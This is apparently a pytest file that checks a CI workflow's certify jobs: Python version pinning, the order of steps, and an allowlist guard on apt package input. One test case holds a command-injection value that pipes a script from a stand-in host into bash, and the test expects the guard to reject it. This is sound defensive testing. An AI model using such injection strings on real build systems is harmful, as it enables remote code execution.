"""Wiring of the certify gate's install environment in build-and-publish-app.yaml.

The certify gate fails closed when an app's dependencies do not install
(FND-4538), so the install must not fail for reasons that are the runner's
fault rather than the app's:

* **Python version.** Unpinned, ``uv sync`` used the runner's system
  ``python3`` (3.14 on ubuntu-latest) while the image ships the golden base's
  3.13. Apps with no ``.python-version`` built wheel-less deps from source and
  failed. Both certify jobs now set ``UV_PYTHON`` from
  ``container_python_version.py print-version`` before any install.
* **System packages.** Native sdists (hive's pykerberos) need headers the
  runner lacks; ``apt_packages`` installs them, with the same allowlist guard
  as tests-reusable.yaml.

The step order and env routing are asserted as YAML shape (the protected
behaviour is GitHub Actions' own). The pin script and the apt guard are
EXECUTED, lifted from the workflow, so a test cannot pass while the workflow
drifts.
"""

from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[3]
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "build-and-publish-app.yaml"
TESTS_REUSABLE = REPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"

CERTIFY_JOBS = ["certify", "certify-unit"]
PIN_STEP = "Pin Python to the app image's version"
APT_STEP = "Install system packages (apt_packages)"
INSTALL_STEP = "Install app dependencies"


@pytest.fixture(scope="module")
def workflow() -> dict:  # type: ignore[type-arg]
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


@pytest.fixture(scope="module")
def tests_workflow() -> dict:  # type: ignore[type-arg]
    return yaml.safe_load(TESTS_REUSABLE.read_text(encoding="utf-8"))


def _steps(workflow: dict, job: str) -> list[dict]:  # type: ignore[type-arg]
    return workflow["jobs"][job]["steps"]


def _index(steps: list[dict], name: str) -> int:  # type: ignore[type-arg]
    names = [step.get("name") for step in steps]
    assert name in names, f"missing step {name!r}"
    return names.index(name)


def _uses_uv(step: dict) -> bool:  # type: ignore[type-arg]
    return "uv " in step.get("run", "") or "certify_unit_shards.py" in step.get(
        "run", ""
    )


# ── Python pin ────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_python_is_pinned_before_any_uv_command(workflow: dict, job: str) -> None:  # type: ignore[type-arg]
    steps = _steps(workflow, job)
    pin = _index(steps, PIN_STEP)
    early = [step.get("name") for step in steps[:pin] if _uses_uv(step)]
    assert not early, f"{job}: uv runs before the Python pin: {early}"


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_pin_runs_after_the_sdk_checkout_it_reads(workflow: dict, job: str) -> None:  # type: ignore[type-arg]
    steps = _steps(workflow, job)
    sdk = [
        i
        for i, step in enumerate(steps)
        if step.get("with", {}).get("repository") == "atlanhq/application-sdk"
    ]
    assert sdk and sdk[0] < _index(steps, PIN_STEP)


def test_sparse_sdk_checkout_includes_the_dockerfile(workflow: dict) -> None:  # type: ignore[type-arg]
    """certify-unit checks out only part of the SDK; print-version reads the
    golden tag from its root Dockerfile, so the sparse set must include it."""
    checkout = next(
        step
        for step in _steps(workflow, "certify-unit")
        if step.get("with", {}).get("repository") == "atlanhq/application-sdk"
    )
    patterns = checkout["with"]["sparse-checkout"].split()
    assert "/Dockerfile" in patterns
    assert ".github/scripts" in patterns


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_pin_exports_the_golden_version(
    workflow: dict,  # type: ignore[type-arg]
    job: str,
    tmp_path: Path,
) -> None:
    """Execute the pin step against an SDK laid out as the job checks it out."""
    sdk = tmp_path / "sdk"
    shutil.copytree(REPO_ROOT / ".github" / "scripts", sdk / ".github" / "scripts")
    shutil.copy(REPO_ROOT / "Dockerfile", sdk / "Dockerfile")
    env_file = tmp_path / "github_env"
    env_file.write_text("", encoding="utf-8")
    script = _steps(workflow, job)[_index(_steps(workflow, job), PIN_STEP)]["run"]
    assert "${{" not in script

    proc = subprocess.run(
        ["bash", "-c", script],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        timeout=30,
        env={"PATH": os.environ.get("PATH", ""), "GITHUB_ENV": str(env_file)},
    )
    assert proc.returncode == 0, proc.stderr
    expected = subprocess.run(
        [
            "python3",
            str(REPO_ROOT / ".github/scripts/container_python_version.py"),
            "print-version",
        ],
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    assert env_file.read_text(encoding="utf-8") == f"UV_PYTHON={expected}\n"


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_pin_fails_closed_without_a_golden_tag(
    workflow: dict,  # type: ignore[type-arg]
    job: str,
    tmp_path: Path,
) -> None:
    """A Dockerfile the pin cannot read must fail the step, not export an
    empty UV_PYTHON that silently falls back to the runner's interpreter."""
    sdk = tmp_path / "sdk"
    shutil.copytree(REPO_ROOT / ".github" / "scripts", sdk / ".github" / "scripts")
    (sdk / "Dockerfile").write_text("FROM python:3.14\n", encoding="utf-8")
    env_file = tmp_path / "github_env"
    env_file.write_text("", encoding="utf-8")
    script = _steps(workflow, job)[_index(_steps(workflow, job), PIN_STEP)]["run"]

    proc = subprocess.run(
        ["bash", "-c", script],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        timeout=30,
        env={"PATH": os.environ.get("PATH", ""), "GITHUB_ENV": str(env_file)},
    )
    assert proc.returncode != 0
    assert env_file.read_text(encoding="utf-8") == ""


# ── apt_packages ──────────────────────────────────────────────────────────────


def test_apt_packages_input_is_declared_and_off_by_default(workflow: dict) -> None:  # type: ignore[type-arg]
    inputs = workflow[True]["workflow_call"]["inputs"]  # `on` parses as True
    assert inputs["apt_packages"]["type"] == "string"
    assert inputs["apt_packages"].get("default", "") == "", (
        "apt_packages must default to empty: a no-op for every existing caller"
    )


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_apt_step_precedes_the_app_install(workflow: dict, job: str) -> None:  # type: ignore[type-arg]
    steps = _steps(workflow, job)
    apt = _index(steps, APT_STEP)
    assert apt < _index(steps, INSTALL_STEP)
    assert steps[apt]["if"] == "inputs.apt_packages != ''"
    assert "continue-on-error" not in steps[apt], (
        "a rejected or failed apt install must fail the job, not fall through "
        "to an install that will fail further from the cause"
    )


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_apt_step_routes_the_value_through_env(workflow: dict, job: str) -> None:  # type: ignore[type-arg]
    step = _steps(workflow, job)[_index(_steps(workflow, job), APT_STEP)]
    assert step["env"]["APT_PACKAGES"] == "${{ inputs.apt_packages }}"
    assert "${{" not in step["run"]


@pytest.mark.parametrize("job", CERTIFY_JOBS)
def test_apt_step_is_byte_identical_to_tests_reusable(
    workflow: dict,  # type: ignore[type-arg]
    tests_workflow: dict,  # type: ignore[type-arg]
    job: str,
) -> None:
    """One guard, now in four places: pin these copies to tests-reusable's so
    a fix to one that misses the others fails here."""
    reference = next(
        step
        for step in tests_workflow["jobs"]["unit"]["steps"]
        if step.get("name") == "Install system packages (apt-packages)"
    )
    step = _steps(workflow, job)[_index(_steps(workflow, job), APT_STEP)]
    assert step["run"] == reference["run"]


def _guard(script: str) -> str:
    lines = script.splitlines()
    start = next(i for i, line in enumerate(lines) if line.strip().startswith("printf"))
    end = start
    while lines[end].rstrip().endswith("\\"):
        end += 1
    return " ".join(line.strip().rstrip("\\") for line in lines[start : end + 1])


@pytest.mark.parametrize(
    ("value", "accepted"),
    [
        ("libkrb5-dev gcc python3-dev", True),  # hive's tests-reusable list
        ("libkrb5-dev", True),
        ("libkrb5-dev; curl evil.example/sh | bash", False),
        ("-y", False),
        ("lib*", False),
        ("", False),
    ],
)
def test_apt_guard_executes_as_an_allowlist(
    workflow: dict,  # type: ignore[type-arg]
    value: str,
    accepted: bool,
) -> None:
    step = _steps(workflow, "certify")[_index(_steps(workflow, "certify"), APT_STEP)]
    proc = subprocess.run(
        ["bash", "-c", f"set -euo pipefail\n{_guard(step['run'])}\n"],
        capture_output=True,
        text=True,
        timeout=30,
        env={"PATH": os.environ.get("PATH", ""), "APT_PACKAGES": value},
    )
    assert (proc.returncode == 0) is accepted, proc.stderr
